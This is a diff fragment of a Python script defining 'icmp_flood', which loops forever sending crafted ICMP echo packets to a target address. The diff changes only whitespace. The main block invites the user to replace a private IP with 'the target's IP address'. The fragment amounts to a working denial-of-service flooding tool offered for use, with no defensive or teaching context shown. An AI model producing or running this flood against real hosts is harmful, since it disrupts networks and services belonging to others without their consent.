@@ -9,13 +9,13 @@ def icmp_flood(target_ip):
       
     packet_id = random.randint(0, 65535) 
       
-    while True: 
-        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1)  
-        s.sendto(packet, (target_ip, 0))
-        packet_id = (packet_id + 1) & 0xFFFF  
+    while True:  
+        packet = struct.pack("BBHHH", 8, 0, 0, packet_id, 1)   
+        s.sendto(packet, (target_ip, 0)) 
+        packet_id = (packet_id + 1) & 0xFFFF   
 
-if __name__ == '__main__':
-    target_ip = "192.168.1.100"    # Replace with the target's IP address 
-     
-    icmp_flood(target_ip)
-
+if __name__ == '__main__': 
+    target_ip = "192.168.1.100"    # Replace with the target's IP address  
+      
+    icmp_flood(target_ip) 
+ 
